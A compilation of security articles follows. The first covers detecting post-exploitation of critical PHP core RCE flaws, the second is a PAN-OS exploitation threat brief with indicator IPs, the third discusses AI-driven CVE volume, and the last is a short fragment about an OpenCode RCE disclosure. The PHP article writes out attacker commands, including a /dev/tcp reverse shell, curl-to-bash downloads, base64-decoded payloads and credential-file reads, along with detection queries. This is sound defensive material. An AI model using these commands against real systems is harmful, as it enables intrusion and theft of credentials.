articles.full_text:
On October 20, 2026, details of two critical remote code execution vulnerabilities in PHP, CVE-2026-109618 and CVE-2026-109619, leaked online ahead of their coordinated disclosure and before any patch existed. The PHP security team responded with advance notice of an emergency security release, scheduled for October 21, 2026 at 14:00 UTC, and rated both flaws critical with a CVSS v4.0 score of 9.2. Researchers at watchTowr confirmed the vulnerabilities are real and said they reproduced CVE-2026-109618, while noting they have not observed in-the-wild exploitation. The nickname circulating among researchers is php2shell.

PHP runs behind a very large share of the web: WordPress, Drupal, Joomla, and Magento, shared hosting and control panels, and a long tail of vendor software that bundles a PHP runtime without advertising it. When a critical bug lands in PHP core rather than in one application on top of it, the number of places you have to inventory grows quickly.

The PHP security team and the reporting researchers have now published the technical root cause, a pair of memory-safety bugs in PHP core, but at the time of writing there is still no reliable public proof-of-concept to run end to end. That is an awkward position for a defender, because you cannot simply run the exploit and watch the rules fire. It is not, however, a blind spot. An RCE in a PHP web application ends in the same observable place: a PHP worker process doing something a PHP worker process should not do. That convergent behavior is what we detect, and it is what this post is about.

In this post, we will cover:

What the advisory confirmed about CVE-2026-109618 and CVE-2026-109619, and what it means for defenders.

Why php2shell will likely behave like generic PHP backend exploitation.

The convergent post-exploitation flow, and the Elastic rules that cover this behavior.

How to assess and prepare potential coverage before the PoC lands, and what to do right now.

We have walked a PHP-adjacent RCE end-to-end before, in Detecting wp2shell: WordPress pre-authentication RCE in the wild, which turned out to use the same precedence and was caught through similar pre-built behavioral rules.

What we know about CVE-2026-109618 and CVE-2026-109619

Here is what is verified at the time of writing, and what is not.

What we know. Both vulnerabilities are unauthenticated remote code execution flaws in PHP core, each rated critical by the PHP security team with a CVSS v4.0 score of 9.2. They were reported by Wiz Research, which identified them with the help of frontier AI models and coordinated disclosure with the PHP project. Additionally, a web page called php2shell was created and contains a lot of relevant information about the vulnerability. Information leaked on October 20 ahead of the embargo, which is why PHP moved its release forward to October 21 at 14:00 UTC. With that release, PHP published the patched versions, the affected branches, and the technical root cause.The PHP security team patched the vulnerabilities through commit 31c0ea7d7ff1d1fccb6492e52dab544011628065.

What we do not know. The advisory names two distinct root-cause classes, both reachable by an unauthenticated web request:

CVE-2026-109618, RCE via out-of-memory (OOM) corruption (GHSA-w8hw-w9fx-j79w): out-of-memory handling can interrupt PHP while internal request data is only partially initialized, and request cleanup may then treat the invalid data as valid.

CVE-2026-109619, RCE via stale global state (GHSA-6wmf-4rv5-p3rp): request-owned internal state can survive after its backing memory has been freed, and a later request handled by the same worker may use that stale state before normal initialization resets it.

Fixed versions are PHP 8.5.12, 8.4.27, 8.3.36, and 8.2.35. The risk spans any PHP installation serving web requests, including PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP, and LiteSpeed, with the PHP team flagging mod_php as highest risk because an unauthenticated request can trigger the issue before any application code runs. PHP 8.1 and older no longer receive updates from the PHP project, though minimal source backports were provided for 7.4, 8.0, and 8.1, and some distributions and LTS vendors ship backported fixes.

Based on public reporting, the activity maps to Exploit Public-Facing Application (T1190), and once an attacker has code execution, to Command and Scripting Interpreter (T1059) and Server Software Component: Web Shell (T1505.003).

Is there a php.ini mitigation for php2shell?

The PHP security team is explicit that there are no complete mitigations and that updating is the only safe choice. It does, however, document configuration measures that reduce exposure to specific attack paths without making an installation safe. For the OOM-corruption path (CVE-2026-109618), set memory_limit=-1 in a way applications cannot override (for example php_admin_value in the FPM pool or Apache configuration), keep post_max_size low, and enforce a container or cgroup limit rather than RLIMIT_AS or RLIMIT_DATA. For the stale-global-state path (CVE-2026-109619), set session.upload_progress.enabled=0 and restart every worker, which blocks the confirmed session paths but not all variants, and on PHP 8.5 set fatal_error_backtraces=0. Apply these through php.ini, an FPM pool, or server configuration that takes effect before request parsing; ini_set() and .user.ini do not help. Treat all of these as temporary exposure reduction, not a fix, and be skeptical of social-media guidance that presents a single config toggle as a complete solution.

Why php2shell exploitation likely looks like every other PHP RCE

We now know the bug class: two memory-safety bugs in PHP core, but the detection opportunity is in the outcome, not the trigger.

A remote attacker exploiting a PHP web application wants code execution in the context of the web stack, and that context is a predictable set of processes: php-fpm and its workers, php-cgi, lsphp, or a general web server like apache2, httpd, or nginx driving PHP. Once the attacker has execution inside that context, the next actions are almost always the same regardless of how they got there:

Confirm access. A first command through a shell to prove execution and establish identity: id, whoami, uname -a, hostname, or cat /etc/os-release.

Enumerate for escalation. Quick checks for a path to root: sudo -l, find / -perm -u=s -type f for SUID binaries, getcap -r / for capabilities, or reading /etc/passwd and /etc/shadow.

Stage through an interpreter. Pivot out of the shell into a richer runtime: python3 -c, perl -e, ruby -e, node -e, or back into PHP itself with php -r, often to run code that never touches disk.

Pull second-stage tooling. Retrieve a payload with curl -O or wget -O, or pipe it straight into an interpreter (curl http(s)://... | bash, wget -qO- http(s)://... | sh).

Decode a staged payload inline. Unpack an embedded blob without a download: echo <b64> | base64 -d | sh, openssl enc -d, or xxd -r.

Open a reverse shell. The usual primitives: bash -i >& /dev/tcp/<ip>/<port> 0>&1, mkfifo paired with nc, socat, a Python pty.spawn, or PHP fsockopen.

Harvest credentials and cloud identity. Read .env files, ~/.aws/credentials, a mounted service account token under (var)/run/secrets/kubernetes.io/, or the instance metadata endpoint at 169.254.169.254.

Drop a webshell. Write attacker-controlled PHP into the web root (.php, .phtml), sometimes disguised as an image polyglot or a double extension such as avatar.php.jpg to slip past upload validation.

Establish persistence beyond the shell. Add a cron entry, a systemd unit, or an SSH key to ~/.ssh/authorized_keys so access survives a webshell cleanup.

This is exactly the host footprint we walked end-to-end in the wp2shell post. There, a completely different bug (a WordPress REST batch route confusion) ended in apache2 spawning dash to run sh -c -- id; whoami; hostname, and plugin files landing under wp-content/. The entry point was WordPress-specific. The thing that fired the detections was not. A web server process spawning a shell or writing a payload is abnormal no matter which vulnerability opened the door, which is why we build detection on that behavior rather than on an exploit string that doesn’t exist yet. Although we can generally predict the outcome, we can never be entirely certain that we fully cover the threat, as there could be other forms of post-exploitation that we don't catch, like creation of an account or fileless PHP script execution.

That is the core of predicting coverage before a PoC lands: detect the convergent flow, not the specific trigger.

The php2shell post-exploitation flow: what a compromised web server does next

This section is the durable, exploit-agnostic layer. It keys on a web server process (PHP runtimes and general web servers) taking an action that is abnormal for a request-serving daemon. We group the coverage by the observable outcome. Endpoint (EDR) rules are shipped in the public protections-artifacts repository and can prevent as well as alert; SIEM rules are shipped in the public detection-rules repository. The queries below show only the distinctive predicate, not the full rule with all of its production exclusions.

Process execution: the web server spawns a shell

The tightest signal for "a PHP RCE just succeeded" is a request-serving process spawning a shell to run a suspicious command. The endpoint rule keys on a non-interactive web server parent launching a shell with a high-risk command line, and terminates it where prevention is enabled:

process where event.type == "start" and event.action == "exec" and process.parent.interactive == false and ( process.parent.name in ("apache2", "httpd", "nginx", "php-cgi") or process.parent.name like ("php-fpm*", "lsphp*") ) and process.name in ("bash", "dash", "sh", "zsh", "ksh") and process.args in ("-c", "-cl", "-lc") and ( process.command_line like~ ( "*/dev/tcp*", "*|*base64 -d*", "*curl*", "*wget*", "*/etc/shadow*" ) or process.args in ("id", "whoami", "hostname") )

This maps to the endpoint rule Payload Execution by Web Server, which covers a broad set of web server parents (the PHP runtimes, Apache, nginx, and many application servers) and a long catalog of suspicious command lines, from discovery commands through reverse shells, decoding pipelines, and credential-file access. It is the rule that terminated dash in the wp2shell run.

On the SIEM side, two rules cover the same shell activity without a preventive action, which lets them carry fewer exclusions and reduce the risk of false negatives. Suspicious Command Execution via Web Server matches known-bad command lines from a web server parent. Unusual Command Execution via Web Server is a new_terms rule: it learns which shell command lines each web server parent normally runs on a host, then alerts on lines that break the baseline. A fresh exploit introduces command lines the host has never seen, so the two stack well together.

Child execution: the web server spawns a non-shell child

Not every PHP RCE goes through a shell. A php2shell payload may invoke an interpreter directly (python -c, perl -e), pull tooling with a downloader, or drop into a reverse-shell helper. Two SIEM rules cover a web server spawning children outside its normal set:

We have an endpoint rule named Suspicious Web Server Child Process, which covers a broad set of web parents and potentially suspicious child processes. This rule has response actions to kill the child process.

For SIEM, we have a similar but broader rule named Suspicious Child Execution via Web Server, which keys on a web server parent whose child is run from a suspicious path (/tmp/, /dev/shm/, /var/tmp/, the web root) or is a suspicious binary (an interpreter, a networking utility, a cloud CLI, a file with a script extension). Unusual Child Execution via Web Server applies the new_terms approach to child executions, surfacing child processes a given web server has never spawned on that host. They did not fire in the wp2shell run, because that chain went through dash and standard discovery binaries that the command-execution rules already cover, but they are the layer that catches a variant invoking curl | bash or python -c directly.

Payload download: the web server pulls second-stage tooling

A common follow-on to PHP RCE is retrieving a second-stage payload. The endpoint rule Payload Downloaded via Curl or Wget by Web Server detects a web server parent invoking curl or wget through a shell to save a remote file to disk or pipe it into an interpreter, and terminates it where prevention is enabled. It did not need to fire in the wp2shell PoC, which carried its own payload, but it is a high-value layer for a real intrusion that stages tooling from an external host.

File creation: the PHP webshell drop

Before any command runs, the attacker often has to write a file: a webshell, a dropped script, an uploaded archive. A web server writing new executable or script content into the web root is abnormal outside of a deployment. Three rules cover this from different angles:

Unusual File Creation via Web Server is a new_terms rule that flags a web server creating or renaming a file it does not normally touch.

Unusual File Creation by Web Server is a building block rule that surfaces unusual file creations by a web server parent, useful as correlation context rather than a standalone alert.

File with High Entropy Created by Web Server keys on a web server writing a high-entropy file with a web-executable extension, a common sign of an encoded or encrypted payload such as an obfuscated .phtml webshell.

How to prepare coverage for php2shell before the exploit exists

Because the post-exploitation flow is predictable, you can line up coverage now rather than scrambling when the exploit code appears. Enable these pre-built SIEM rules on any host running PHP or a web server:

Suspicious Command Execution via Web Server

Unusual Command Execution via Web Server

Suspicious Child Execution via Web Server

Unusual Child Execution via Web Server

Unusual File Creation via Web Server

Unusual File Creation by Web Server

File with High Entropy Created by Web Server

Web Shell Detection: Script Process Child of Common Web Processes

Deploy Elastic Defend with prevention enabled on those same hosts to add the endpoint layer, which can terminate processes that match the applicable behavioral rules. The high-entropy rule require Elastic Stack 9.3.0 or later. In the Elastic Defend integration policy, under advanced settings, set linux.advanced.events.populate_file_data to true and verify that incoming file events include file.Ext.entropy for the high-entropy rule.

The coverage spans two data sources, process and file, which is why both layers matter:

Public Elastic rule guidance for the php2shell post-exploitation flow

If your web stack runs behind a parent process that is not yet in these lists, let us know so we can extend their scope.

How to find PHP installs that may be affected by php2shell

Start by identifying PHP deployments across Linux and Windows, including runtimes bundled with other applications. Patched versions are PHP 8.5.12, 8.4.27, 8.3.36, and 8.2.35, so use the queries below to inventory PHP across your environment and prioritize anything that is unpatched or end of life.

Find PHP through process telemetry

In Kibana Discover, select a data view containing process events, such as logs-endpoint.events.process-*, and search the available retention period, for example, the last 7 days:

event.category: process and ( process.name: (php* or lsphp* or frankenphp or sw-engine-fpm) or process.parent.name: (php* or lsphp* or frankenphp or sw-engine-fpm) )

Review host.name, process.executable, process.parent.executable, and container.id where available. The query includes common Windows process names such as php.exe and php-cgi.exe. Parent-process matches can also reveal PHP workers through their recorded child processes.

Locate PHP installs on Linux and Windows

Process telemetry can miss inactive installations. Use Osquery to check common system and hosting-platform locations for PHP binaries and Apache PHP modules. The first example runs the query for Linux systems:

SELECT DISTINCT path, filename, type, symlink FROM file WHERE ( path LIKE '/usr/bin/php%' OR path LIKE '/usr/sbin/php%' OR path LIKE '/usr/local/bin/php%' OR path LIKE '/usr/local/sbin/php%' OR path LIKE '/usr/lib/cgi-bin/php%' OR path LIKE '/opt/cpanel/ea-php%/root/usr/bin/php%' OR path LIKE '/opt/cpanel/ea-php%/root/usr/sbin/php-fpm%' OR path LIKE '/opt/plesk/php/%/bin/php%' OR path LIKE '/opt/plesk/php/%/sbin/php-fpm%' OR path LIKE '/opt/remi/php%/root/usr/bin/php%' OR path LIKE '/opt/remi/php%/root/usr/sbin/php-fpm%' OR path LIKE '/opt/rh/rh-php%/root/usr/bin/php%' OR path LIKE '/opt/rh/rh-php%/root/usr/sbin/php-fpm%' OR path LIKE '/usr/local/lsws/lsphp%/bin/lsphp' OR path LIKE '/usr/local/lsws/fcgi-bin/lsphp%' OR path LIKE '/snap/php%/%/bin/php%' OR path LIKE '/nix/store/%php%/bin/php%' OR path LIKE '/usr/lib/apache2/modules/libphp%.so' OR path LIKE '/usr/lib/httpd/modules/libphp%.so' OR path LIKE '/usr/lib64/httpd/modules/libphp%.so' /* Generic custom installation paths */ OR path LIKE '/%/php%/php%' OR path LIKE '/%/php%/%/php%' OR path LIKE '/%/%/php%/php%' OR path LIKE '/%/%/php%/%/php%' OR path IN ( '/usr/bin/lsphp', '/usr/local/bin/lsphp', '/usr/bin/frankenphp', '/usr/local/bin/frankenphp' ) ) ORDER BY path;

The second query checks common Windows standalone and bundled installations.

SELECT DISTINCT path, filename, file_version, product_version FROM file WHERE ( path LIKE 'C:\PHP%\php%' OR path LIKE 'C:\PHP%\%\php%' OR path LIKE 'C:\%\PHP%\php%' OR path LIKE 'C:\%\PHP%\%\php%' OR path LIKE 'C:\Program Files%\%\PHP%\php%' OR path LIKE 'C:\Program Files%\%\PHP%\%\php%' OR path LIKE 'C:\wamp%\bin\php\%\php%' OR path LIKE 'C:\laragon\bin\php\%\php%' OR path LIKE 'C:\Program Files%\Plesk\Additional\%PHP%\php%' OR path LIKE 'C:\Program Files%\Plesk\admin\bin\php%' ) AND LOWER(filename) IN ('php.exe', 'php-cgi.exe', 'php-win.exe') ORDER BY path;

This results in the following example hits:

We can also leverage OSQuery’s deb_package and rpm_package tables:

SELECT name, version, arch, status FROM deb_packages WHERE status = 'install ok installed' AND ( name LIKE 'php%' OR name LIKE 'libapache2-mod-php%' OR name LIKE 'lsphp%' OR name LIKE 'ea-php%' OR name LIKE 'plesk-php%' OR name = 'sw-engine' ) ORDER BY name;

And:

SELECT name, version, release, epoch, arch FROM rpm_packages WHERE name LIKE 'php%' OR name LIKE 'lsphp%' OR name LIKE 'ea-php%' OR name LIKE 'plesk-php%' OR name = 'sw-engine' ORDER BY name;

Of course, this is a short list of potential locations; use your own inventory to scan your environment. Extend these paths for other drives, custom installations, and vendor software. Inspect container filesystems separately. File matches may include unused installations, wrappers, or helper utilities. Missing results do not establish that PHP is absent.

What to do about CVE-2026-109618 and CVE-2026-109619 right now

PHP has released the fixes, so patching is now the priority, with exposure reduction for anything you cannot patch immediately:

Inventory every PHP install you own. Start with internet-facing web servers, then go looking for the less obvious locations: vendor appliances and software that bundle a PHP runtime, control panels, and anything running WordPress, Drupal, Joomla, or Magento.

Patch internet-facing systems first, to PHP 8.5.12, 8.4.27, 8.3.36, or 8.2.35, and check your Linux distribution and hosting provider for backported packages.

Identify end-of-life PHP. If you are running PHP 8.1 or older, the PHP project no longer ships updates, though minimal source backports exist for 7.4, 8.0, and 8.1 and some vendors provide backported packages. Upgrade, take it off the internet, or place it behind a VPN or web application firewall until you can.

If you cannot patch immediately, apply PHP's documented partial mitigations (for example session.upload_progress.enabled=0, and a constrained memory_limit and post_max_size), but treat them as temporary exposure reduction, not a fix.

If you find something, isolate the host and preserve web server and PHP logs. Look for webshells and new files in the web root, along with new cron jobs, services, and accounts.

php2shell detection: what holds regardless of the root cause

CVE-2026-109618 and CVE-2026-109619 are two critical, unauthenticated PHP core RCE flaws that were publicly identified before their coordinated disclosure. The patched releases (8.5.12, 8.4.27, 8.3.36, 8.2.35) and the two root-cause classes are now public, but the post-exploitation outcome is what makes them detectable: a web server process spawning a shell, pulling a payload, or dropping a webshell into the web root. Elastic already ships the behavioral layer that catches that convergent flow across both process and file telemetry.

Patch now, isolate what you cannot patch, and verify the web-server-to-shell detection stack is enabled on your PHP hosts. We will revisit this post with concrete telemetry as reliable public exploitation details emerge.

articles.title: Active Exploitation of May 2026 PAN-OS CVE-2026-0257 (Updated October 20)
articles.context: June 5, 2026 In June 2026, Palo Alto Networks Unit 42 observed active exploitation of the May 2026 PAN-OS vulnerability CVE-2026-0257 by an unidentified threat actor attempting...
articles.full_text:
Executive Summary

October 19 Update

Unit 42 has observed attempted exploitation of the May 2026 CVE-2026-0257 by ransomware operators, including Spikey Scorpius (aka Qilin) and Tarnished Scorpius (aka Inc).

We’re also aware of public reporting attributing exploitation to threat actors using Settra ransomware.

Fixes for this vulnerability have been available since May 2026. Palo Alto Networks has become aware of limited exploit attempts on unpatched PAN-OS devices without mitigations applied.

Customers can mitigate the risk of this issue by taking any of the following actions:

Use a dedicated certificate for Authentication Override cookies: Generate a new certificate exclusively for authentication override cookies and store it securely. Do not reuse the portal or gateway certificate, and do not share this certificate with other features or users.

Disable Authentication Override: Uncheck the Authentication Override options (for generating and accepting cookies) in the GlobalProtect portal and gateway configuration.

June 5, 2026

In June 2026, Palo Alto Networks Unit 42 observed active exploitation of the May 2026 PAN-OS vulnerability CVE-2026-0257 by an unidentified threat actor attempting to access GlobalProtect. This security flaw involves an authentication bypass in the portal and gateway components of vulnerable versions of PAN-OS® software, which could allow unauthorized attackers to circumvent security controls and initiate virtual private network (VPN) connections.

This CVE was added to the Known Exploited Vulnerability (KEV) catalog on May 13, 2026.

No post-access behavior or lateral movement was identified. Only a small portion of the probed devices actually established VPN sessions, resulting in gateway-connected events.

We advise organizations to proactively hunt for the indicators of the activity specified in this report and activate incident response protocols for any successful gateway-connected events linked to these indicators. Additionally, we strongly recommend reviewing the security advisory for CVE-2026-0257, following the available workarounds and mitigations or upgrading to a version that includes a fix for this issue.

For pre-proof-of-concept release (May 29, 2026) activities, search for these IP addresses in GlobalProtect logs to look for successful login connection:

23.128.228[.]6

104.207.144[.]154

146.19.216[.]119

146.19.216[.]120

146.19.216[.]125

179.43.172[.]213

185.195.232[.]139

198.12.106[.]60

202.144.192[.]47

Search GlobalProtect logs for successful gateway-connected events from any IP address using suspicious host IDs or device names, including but not limited to:

aa:bb:cc:dd:ee:ff

00:11:22:33:44:55

WINDOWS-LAPTOP-001

DESKTOP-GP01

GP-CLIENT

As part of post-PoC release monitoring, search GlobalProtect logs for successful gateway-connected events matching the following hard-coded client configuration values from the PoC code.

endpoint_os_version : Microsoft Windows 10 Pro 64-bit

source_user_info.domain : empty

We encourage organizations to consult our official Palo Alto Networks Security Advisory for additional details about the vulnerability and configuration guidance. We also recommend reading Rapid7’s technical analysis about the exploitation activity they observed in the wild.

Palo Alto Networks Cortex Xpanse is able to identify publicly exposed PAN-OS gateways and GlobalProtect portals.

Management Interface Exposure Risk and Remediation

During incident response (IR) engagements associated with the Lunar Peak campaign, Unit 42 observed a recurring misconfiguration that led to critical, unintended exposure. Specifically, organizations frequently mapped GlobalProtect (GP) profiles to HTTP/HTTPS services on their management interfaces.

This configuration inadvertently exposes the management interface to the internet on specific ports, most notably 4443 and 3879, often without administrators' knowledge. While the risks of this exposure were previously documented, the frequency of this oversight during the Lunar Peak incidents prompted a comprehensive update to our official guidance to ensure maximum clarity.

Verification and mitigation:

Verify exposure: Defenders can rapidly verify whether their environments are affected by attempting an out-of-band HTTPS connection to their management IP address on ports 4443 and 3879 via an external web browser.

Remediate: To remediate this issue and enforce the principle of least privilege, we strongly advise administrators to review official Palo Alto Networks documentation on configuring Interface Management profiles to safely restrict access.

Update: Oct. 19, 2026

Ransomware operators exploiting the May 2026 CVE-2026-0257 include Spikey Scorpius (aka Qilin) and Tarnished Scorpius (aka Inc). Public reporting attributes exploitation to threat actors using Settra ransomware.

Attackers are leveraging this vulnerability to gain an initial foothold into corporate networks, subsequently bypassing multi-factor authentication (MFA) controls to establish a VPN session. Following this, the threat actors are typically:

Conducting internal network reconnaissance using dual-use remote monitoring and management (RMM) tools

Moving laterally via RDP and SMB

Staging additional tooling for credential harvesting, data exfiltration and ultimately, ransomware deployment

Our investigations have continued since early June 2026, and have spanned across numerous industries, including:

Education

Financial services

Healthcare

High technology

Hospitality

Manufacturing

Professional and legal services

Government

Transportation and logistics

Utilities and energy

Wholesale and retail

The most significant evolution in tactics, techniques and procedures (TTPs) following successful exploitation of CVE-2026-0257 is the direct pivot to the virtualization layer. In one notable case, attackers moved from the compromised VPN gateway to the vCenter management appliance. From there, they disabled security controls on ESXi hypervisors (execInstalledOnly) and used a custom tool to perform offline credential dumping directly against a domain controller's virtual disk (VMDK).

This tactic bypasses in-guest endpoint detection and response (EDR) and security controls, representing a highly sophisticated method for obtaining domain-wide credentials. We have also observed actors chaining this initial access with other exploit tools, such as those targeting Veeam backup infrastructure (CVE-2023-27532), to maximize their impact.

Conclusion

Palo Alto Networks shared our findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the Cyber Threat Alliance.

We will update this threat brief as more relevant information becomes available.

The products listed below can help protect PANW customers against exploits targeting CVE-2026-0257.

Palo Alto Networks Product Protections for PAN-OS CVE-2026-0257

Palo Alto Networks customers can leverage a variety of product protections and updates to identify and defend against this threat.

Organizations can access tailored adversary intelligence, direct analyst consultations, and specialized exposure tracking through Unit 42 Threat Intel Services and its Deep and Dark Web Service.

If you think you might have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call:

Cloud-Delivered Security Services for the Next-Generation Firewall

Advanced URL Filtering and Advanced IP Defense are designed to identify known IP addresses associated with this activity as malicious.

Cortex AgentiX

Security analysts can use natural language to prompt the Cortex AgentiX Threat Intel agent to extract file indicators from this threat brief. They can then enrich them, check for sightings in their Cortex tenant and related alerts, and provide a quick summary of the impact to the organization.

Cortex XDR and XSIAM

Cortex XDR and XSIAM are designed to provide comprehensive protections for endpoint attacks. It helps block post-exploit activity with its Behavioral Threat Protection, AI-driven local analysis, cloud-based malware analysis and other security engines across Windows, Linux, and Mac systems.

Cortex Xpanse

Cortex Xpanse has the ability to identify exposed PANOS devices on the public internet and escalate these findings to defenders. Customers can enable alerting on this risk by ensuring that the PAN-OS Device Attack Surface Rule is enabled. Identified findings can either be viewed in the Threat Response Center or in the incident view of Expander. These findings are also available for Cortex XSIAM customers who have purchased the ASM module.

Idira

Idira Privileged Access Management (PAM) is designed to unify privileged access across human, machine, and agentic identities to secure cloud access across multi-cloud environments. Building on proven PAM, it delivers centralized secrets management alongside modern controls like Just-in-Time access and Zero Standing Privileges. This enforces consistent least-privilege security across on-premises, cloud, and SaaS targets.

articles.title: There's only so much code: the rise in vulnerability numbers
articles.context: Despite a 105% year-over-year surge in CVEs, Known Exploited Vulnerabilities (KEVs) grew by only 37%, and only 3 of September's 975 Microsoft advisories saw in-the-wild...
articles.full_text:
Frontier AI models (like Mythos) are rapidly mining decades of technical debt across ubiquitous legacy libraries, driving monthly Microsoft Patch Tuesday vulnerability advisories up more than tenfold (reaching 1,415 this month). This volume is overwhelming open-source maintainers and putting pressure on the traditional 90-day coordinated disclosure model.

Despite a 105% year-over-year surge in CVEs, Known Exploited Vulnerabilities (KEVs) grew by only 37%, and only 3 of September's 975 Microsoft advisories saw in-the-wild exploitation, demonstrating that the vast majority of AI-discovered bugs are not practically exploited.

We may be able to take new-bug-class vulnerability spikes as evidence that these vulnerabilities will eventually level off and decline, once the historical code backlog is remediated and AI verification is embedded directly into new development pipelines.

With attackers able to parse patches faster via AI, defenders cannot cover for all possible threats. Organizations should continue to build robust defense-in-depth. Prioritize high-exploitability flaws in their specific environments, implement interim mitigations (such as LiveProtect), deploy behavioral anomaly detection, and integrate current AI evaluation models into their software build chains.

The September Microsoft Tuesday release included 975 vulnerability advisories. This month, 1,415 vulnerabilities were just dropped. Compared to a pre-June average of 100 a month, that increase is staggering. Where did they come from?

As of April, frontier models came onto the scene more fine-tuned than ever toward vulnerability detection, particularly with the introduction of Mythos. The deluge brings a lot of questions:

If these numbers are real, why hasn’t the internet collapsed?

Are these vulnerabilities a new breed, and if not, why didn’t analysts find them in code that is sometimes decades old?

Is the coordinated disclosure model still relevant in an era of this kind of speed?

How in the world do defenders deal with those numbers?

Should we go home, kiss our spouses, and prepare for the end?

The answer to many of these questions boils down to this: The majority of these vulnerabilities are coming from repositories of old code from large-profile products and systems; and disclosure does not equal weaponization.

Where is it from?

AI is chewing through a backlog of technical debt in libraries and tools used as the dependable, best-practice lynchpins of so many environments. These models have a new perspective, an ability to "think" without some of the hangups or assumptions of human defenders, and they are thorough in listing those vulnerabilities.

Entrenched older tools have always been prime targets because of their predictability; attackers know those tools and all their secrets, and they know what is likely to be present in a network with them. Multi-exploit attacks can be deployed with little variability.

Pre-Mythos threat actors exploited log4j (CVE-2021-44228) to immense success. The library was ubiquitous, included in nearly every environment, but not a component that got cataloged in visibility scans. A combination of scale and low visibility meant defenders were blindsided, scrambling to find out if they even used the log4j library before starting to concoct a mitigation plan.

Talos has ongoing relationships with some of the largest technical vendors (such as the Microsoft Active Protections Process (MAPP) agreement). Organizations share additional information—detection guidance or maybe a POC — for vulnerabilities that are most likely to be exploited, to enable Talos to provide adequate coverage when the advisories are announced. "Microsoft believes it is important for us to provide detection content, based on their guidance," as Yves Younan, Director of Talos Vulnerability Discovery, Detection, and Testing, says.

Talos has needed to invest more resources to get coverage in on time for critical vendors like Microsoft to keep up with notifications coming in fast and often on staggered or out-of-band timelines.

For larger vendors, the pressure is handleable for now. However, open-source projects are getting flooded. Some projects have a trusted group that can combine to tackle patches, and some share with the full community for immediate assistance, but it is up to the project. The internet runs on open-source work.

The pace of discovery presents a challenge for the traditional coordinated disclosure system vulnerability hunters have been using for years, and some are calling it into question.

Security vulnerabilities should be reported, to enable an informed defender base and regular patching, and vendors responsible for vulnerable code need time to create coverage. A timed disclosure model where notifications are sent to a vendor, who then has a set period of time (typically 90 days) to provide coverage before the disclosure is released publicly, has created a more secure online environment for decades.

Now, many practitioners are releasing advisories publicly without a disclosure period beforehand. The reasoning is that if one AI can find a weakness, any other could, so the vulnerability is already, effectively, released.

This conversation is actively changing expectations around vulnerability disclosure, and guidance is in flux.

Will it stay this high?

No one knows the future, but we can always look to the past for insight.

Numbers of vulnerabilities jump drastically when a new bug class is identified, as their possibilities are explored to the fullest. Then the discoveries plateau and drop off.

When format string vulnerabilities were discovered as a new bug class in 2000, the initial influx of discoveries ramped up and up, until reaching a peak in 2005 and then slowly declining over the next couple of years. Format string vulnerabilities are still discovered, but they are a smaller overall fraction of the number of CVEs discovered in a year.

Theoretically, AI-assisted vulnerability discovery could go the same way.

While frontier models have not discovered a new vulnerability class, they are more efficient at discovering known types of software vulnerabilities. Given that a lot of vital software has a long history of code releases, there’s plenty of code to mine for weaknesses. But there’s only so much code… right?

Old and commonly used tools are often under the highest scrutiny, lending them one kind of safety: Because of their popularity, utility, and stability, when popular tools have vulnerabilities, they are discovered fast and patched promptly.

As the historical backlog of essential systems is turned over by AI, vulnerabilities will be found and patched. New code will ideally be run through AI bug-checkers that will prevent new vulnerabilities from being introduced. The rate of new vulns should level off and drop accordingly.

There are some caveats. In the past, as vulnerability disclosures increased through coordinated disclosures, we saw increased adoption of mitigations. Exploitation became significantly harder. Attackers often need to chain together 3 or more vulnerabilities to successfully exploit a system.

However, more awareness of vulnerabilities often leads to more exploitation. Attackers often use vendor patches meant to protect customers to discover where vulnerabilities might exist. The frequency of patching has delayed human attackers via parsing bottlenecks, but AI can eliminate that problem.

Are the numbers the real issue?

The volume is certainly up.

Fresh as this blog is being finished, the October Patch Tuesday dropped almost 500 more than last month.

With refinement, any vulnerability could become a link to a path of effect. But... not all vulnerabilities are exploitable. Some are wildly impractical for attacker use. In fact, the percent of Known Exploited Vulnerabilities (KEVs) is vastly smaller than the found vulnerabilities.

Of the 975 vulnerabilities Microsoft reported in September, there were only three in-the-wild exploits detected. When viewed by percentage, vulnerabilities versus KEVs tell a different and perhaps reassuring story.

Compared with the same period last year, additions to the known-exploited vulnerability list increased by 37%, while published CVEs increased by 105%. However, we wouldn't necessarily expect those figures to grow in proportion. Adversaries only need enough useful vulnerabilities to compromise their targets, and the same vulnerabilities can be reused against many organizations. The KEV count tracks distinct vulnerabilities known to be exploited, not the number of attacks or successful compromises.

AI helps ingest code, advisory reports, and attack surfaces with inhuman speed, but it cannot currently make judgment calls about the value of a weakness.

For defenders, the question remains the same: Which vulnerabilities provide a viable path into their environment, and how do you close those paths?

What do we do now?

The undeniable danger here is in exploitation time going down rapidly, while the vulnerabilities that could become exploits is still going up. The biggest hurdle for a defender is determining what is a real vulnerability for their environment, and what is not.

Different defenders have different forms of control depending on their role.

For those who are writing code, the new standard validation chain should include AI evaluation by models at least as up to date as those being used to hunt for vulnerabilities. It is relatively cheap to run new code through AI, but very expensive to run a cumbersome backlog of old code through. Bite it off in chunks.

For those whose role involves keeping the tools ready: Upgrade ASAP. Don't stop there.

For Cisco customers, implement LiveProtect to mitigate vulnerabilities between advisory release day and patching, to give time for that patching. Do this for everything you own.

Move beyond static domain blocking and implement behavioral detection that alerts on anomalous traffic patterns directed toward automation platforms.

Hone your focus to the vulnerabilities with the highest exploitability in your environment. KEVs are far less common among the sea of advisories, and their numbers have not risen proportionally with the AI-assisted deluge.

Focus on building defense-in-depth. Employ multiple protection systems, to cover for delays in patching. Implement interim mitigations (such as LiveProtect), create custom IPS/Snort triggers to block pre-patched traffic using SnortML, deploy behavioral anomaly detection, and integrate current AI evaluation models in software build chains.

Dive deeper into this conversation with the latest TTP interview with Yves Younan and vulnerability researcher Bella Fusari.

For more numbers and advice for defenders:

Don't swing at everything

Threat Source Newsletter: Discovery ≠ Exploitation

articles.title: Researchers Warn OpenCode Quietly Patched Critical RCE Flaw, Leaving Users At Risk
articles.context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
articles.full_text:
The Pillar Security team reported the vulnerability privately via GitHub Security Advisory with full reproduction material at the end of August 2026.

A month later, Anomaly, the company behind OpenCode, confirmed it had received the report, but said malicious MCP servers are “outside their threat model.”

